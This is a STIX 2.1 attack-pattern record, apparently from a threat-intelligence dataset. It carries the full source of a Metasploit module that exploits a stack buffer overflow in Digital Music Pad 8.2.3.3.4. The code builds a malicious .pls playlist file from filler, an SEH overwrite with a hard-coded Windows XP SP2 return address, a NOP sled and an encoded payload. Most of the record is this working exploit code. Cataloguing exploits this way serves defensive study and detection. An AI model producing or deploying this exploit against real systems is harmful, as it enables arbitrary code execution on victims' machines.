{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0877be99-b25f-475c-b030-9d4651ded173",
    "created": "2024-08-14T16:37:11.265956Z",
    "modified": "2024-08-14T16:37:11.26596Z",
    "name": "Digital Music Pad Version 8.2.3.3.4 Stack Buffer Overflow",
    "description": " This module exploits a buffer overflow in Digital Music Pad Version 8.2.3.3.4 When opening a malicious pls file with the Digital Music Pad a remote attacker could overflow a buffer and execute arbitrary code.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/digital_music_pad_pls.rb",
            "external_id": "digital_music_pad_pls.rb"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20100923154433/http://secunia.com:80/advisories/41519"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Digital Music Pad Version 8.2.3.3.4 Stack Buffer Overflow',\n      'Description' => %q{\n          This module exploits a buffer overflow in Digital Music Pad Version 8.2.3.3.4\n        When opening a malicious pls file with the Digital Music Pad,\n        a remote attacker could overflow a buffer and execute\n        arbitrary code.\n      },\n      'License' => MSF_LICENSE,\n      'Author' =>\n        [\n          'Abhishek Lyall <abhilyall[at]gmail.com>'\n        ],\n      'References' =>\n        [\n          [ 'OSVDB', '68178' ],\n          [ 'URL', 'http://web.archive.org/web/20100923154433/http://secunia.com:80/advisories/41519' ],\n          [ 'EDB', '15134' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload' =>\n        {\n          'Space' => 4720,\n          'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n          'DisableNops' => 'True',\n        },\n      'Platform' => 'win',\n      'Targets' =>\n        [\n          [ 'Windows XP SP2', { 'Ret' => 0x73421DEF } ], # p/p/r msvbvm60.dll\n        ],\n      'Privileged' => false,\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2010-09-17'))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.pls']),\n      ])\n  end\n\n  def exploit\n\n    # PLS Header\n    sploit = \"[playlist]\\n\"\n    sploit << \"File1=\"\n\n    sploit << rand_text_alphanumeric(260)\n    sploit << generate_seh_record(target.ret)\n\n    sploit << \"\\x90\" * 12                   # nop sled\n    sploit << payload.encoded\n\n    sploit << \"\\x90\" * (4720 - payload.encoded.length)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(sploit)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-09-17",
    "x_mitre_platforms": [
        "win'"
    ]
}